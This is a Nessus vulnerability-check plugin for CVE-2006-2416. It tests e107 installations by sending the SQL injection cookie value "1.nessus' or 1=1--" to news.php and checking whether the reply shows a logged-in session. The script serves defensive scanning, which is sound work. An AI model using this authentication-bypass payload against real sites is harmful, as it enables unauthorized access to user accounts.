#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21555);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2006-2416");
  script_bugtraq_id(17966);
  script_xref(name:"OSVDB", value:"25521");

  script_name(english:"e107 e107_cookie Parameter SQL Injection");
  script_summary(english:"Tries to bypass authentication in e107 with a special cookie");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection issue." );
 script_set_attribute(attribute:"description", value:
"The version of e107 installed on the remote host fails to sanitize
input to the application-specific cookie used for authentication. 
Provided PHP's 'magic_quotes_gpc' setting is disabled, an
unauthenticated attacker can leverage this issue to bypass
authentication and generally manipulate SQL queries." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/433938/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?957c33df" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to e107 version 0.7.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  # Try to exploit the issue to bypass authentication.
  exploit = string("1.nessus' or 1=1--");
  set_http_cookie(name: 'e107cookie', value: urlencode(str:exploit));
  r = http_send_recv3(method: 'GET', item:string(dir, "/news.php"), port:port);
  if (isnull(r)) exit(0);
  # There's a problem if it looks like we are logged in.
  if (
    # 0.7.x
    'user.php?id.1">Profile</a>' >< r[2] ||
    # 0.6.x
    "user.php?id.1'>Profile</a>" >< r[2]
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
